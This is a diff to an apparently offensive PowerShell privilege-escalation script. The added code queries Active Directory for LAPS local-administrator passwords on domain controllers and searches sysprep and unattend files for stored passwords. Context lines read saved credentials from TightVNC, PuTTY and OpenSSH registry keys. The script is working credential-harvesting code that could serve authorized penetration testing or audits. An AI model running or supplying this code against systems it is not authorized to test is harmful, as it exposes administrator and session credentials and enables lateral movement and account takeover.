@@ -49,9 +49,29 @@ Function Test-PrivEsc {
         Get-ItemProperty -Path "HKCU:\Software\TightVNC\Server" -ErrorAction "SilentlyContinue"
         Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction "SilentlyContinue"
         Get-ItemProperty -Path "HKCU:\Software\OpenSSH\Agent\Key" -ErrorAction "SilentlyContinue"
-        
-        Write-Host "To perform a more in depth search use SessionGopher: https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1" -ForegroundColor "Cyan"
 
+        Write-Verbose "Searching for LAPS password (Requires admin permissions to obtain)"
+        $Domain = New-Object -TypeName "System.DirectoryServices.DirectoryEntry"
+        $Search = New-Object -TypeName "System.DirectoryServices.DirectorySearcher"
+        $Search.SearchRoot = $Domain
+        $Search.Filter = "(primaryGroupID=516)"
+        $Search.SearchScope = "Subtree"
+        $Result = $Search.FindAll()
+        $Object = $Result.GetDirectoryEntry()
+        $Object | Select-Object -Property 'Name','ms-Mcs-AdmPwd'
+
+        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
+        ForEach ($PassFile in $PassFiles)
+        {
+
+            If (Test-Path -Path $PassFile)
+            {
+
+                Get-Content -Path $PassFile | Select-String -Pattern "Password"
+
+            }  # End If 
+
+        }  # End ForEach 
 #============================================================================================================
 #  AlwaysInstallElevated PRIVESC
 #============================================================================================================
